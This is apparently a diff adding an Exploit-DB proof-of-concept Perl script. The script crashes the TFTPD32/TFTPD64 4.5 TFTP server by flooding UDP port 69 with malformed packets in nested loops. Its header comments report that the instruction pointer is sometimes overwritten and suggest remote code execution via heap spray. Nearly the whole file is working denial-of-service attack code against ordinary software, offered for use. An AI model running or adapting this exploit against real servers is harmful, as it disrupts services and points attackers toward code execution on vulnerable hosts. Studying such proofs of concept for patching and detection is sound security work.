@@ -1,0 +1,39 @@
+# Exploit Title: TFTPD32 4.5 / TFTPD64 4.5 DoS poc
+# Date: 13/05/2014
+# Exploit Author: j0s3h4x0r
+# Homepage: http://tftpd32.jounin.net/tftpd32_testimonials.html
+# Software Link: http://tftpd32.jounin.net/download/tftpd32.450.zip
+# Version: 4.5 32 bits / 4.5 64 bits
+# Tested on: [Windows 7 x64]
+
+#this proof of concept code will crash tftpd32 and tftpd64
+#you can try changing $j and $i loop limits
+#most of the times EIP reaches 0x2E373231 == "127." or any string contained in tftpd32 error logs
+#and sometimes EIP reaches addresses similar to 0x00013200 so Remote Code Execution may be possible using some form of heap-spray
+
+## Exploit-DB Note: $j=5, $i=2500 caused a crash. 
+
+
+
+#!/usr/bin/perl -w
+
+use IO::Socket;
+
+for (my $j = 0; $j < 2; $j++)
+{
+	sleep(2);
+	for (my $i = 0; $i < 1500; $i++)
+	{
+		$st_socket = IO::Socket::INET->new(Proto=>'udp', PeerAddr=>'127.0.0.1', PeerPort=>69) or die "connect error";
+	
+		$p_c_buffer = "\x0c\x0d" x 10;
+	
+		print $st_socket $p_c_buffer;
+	
+		close($st_socket);
+
+		print "sent " . $i . "\n";
+	}
+}
+
+exit;
